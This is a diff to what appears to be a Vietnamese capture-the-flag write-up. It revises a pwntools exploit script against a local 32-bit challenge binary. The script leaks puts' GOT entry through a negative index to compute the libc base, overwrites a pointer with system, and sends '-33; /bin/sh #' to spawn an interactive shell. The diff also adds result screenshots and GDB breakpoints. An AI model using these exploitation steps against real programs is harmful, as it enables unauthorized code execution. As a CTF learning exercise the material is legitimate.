@@ -236,7 +236,13 @@ puts_got
 system
 0xdeadbeef // random
 bin_sh
-``` 
+```
+
+Kết quả:
+
+<img width="798" height="692" alt="image" src="https://github.com/user-attachments/assets/f804c678-d375-414f-862e-ce50a8750047" />
+
+<img width="800" height="745" alt="image" src="https://github.com/user-attachments/assets/1927661e-cc65-4d61-bd42-163b31d95875" />
 
 ____
 script.py:
@@ -250,11 +256,15 @@ context.log_level = "debug"
 
 def GDB():
 	gdb.attach(p, gdbscript='''
+		handle SIGALRM ignore
 		br main
 		br *main + 58
+		br *main + 88
+
+		# br *puts + 190
 
 		x/4gx 0x080580d0
-		gots puts
+		got puts
 		''')
 
 p = process(exe.path)
@@ -270,41 +280,51 @@ puts_plt = exe.plt['puts']
 puts_got = exe.got['puts']
 main_addr = 0x0804a61b
 
-payload = p32(puts_plt) + p32(main_addr) + p32(puts_got)
+#  0x 0804a61b 08048b90      0x 00000000 0805509c
+
+# payload = p32(puts_plt) + p32(puts_got) + p32(main_addr) 
+payload = p32(puts_plt)
 p.sendlineafter(b"Enter your name: ", payload)
 
 p.recvuntil(b"> ")
 p.sendline(b"1")
 
+payload = b"-33".ljust(4, b"\x00") 
+payload += p32(main_addr)
+payload += p32(puts_got)  
+p.recvuntil(b"> ")
+p.send(payload)
+
 p.recvuntil(b"> ")
 p.sendline(b"-33")
 
-p.recvuntil(b"> ") 
-leak = u32(p.recv(4))
-
+leak = p.recv(16)
+leak = u32(leak[-4:])
 print(f"leak: {hex(leak)}")
 
-libc.address = leak - libc.symbols['puts']
-
+libc.address = leak - 0x9cdc
 print(f"libc_base: {hex(libc.address)}")
 
 ### tao ROP ###
+system = libc.symbols['system']
+bin_sh = next(libc.search(b"/bin/sh"))
+
 p.recvuntil(b"> ")
 p.sendline(b"6")
 p.recvuntil(b"> ")
 p.sendline(b"2")
-
-system = libc.address + libc.symbols['system']
-bin_sh = libc.address + next(libc.search(b"/bin/sh"))
-
-payload = p32(system) + p32(0xdeadbeef) + p32(bin_sh)
-p.sendlineafter(b"Enter your name: ", payload)
-
+p.sendlineafter(b"Enter your name: ", p32(system))
 p.recvuntil(b"> ")
 p.sendline(b"1")
 
+# payload = b"-33; ls".ljust(4, b"\x00") 
+# payload += p32(bin_sh)
+# payload += p32(bin_sh)  
+# payload += p32(bin_sh)  
+# payload += p32(bin_sh)  
+payload = b"-33; /bin/sh #"
 p.recvuntil(b"> ")
-p.sendline(b"-33")
+p.send(payload)
 
 p.interactive()
 ```
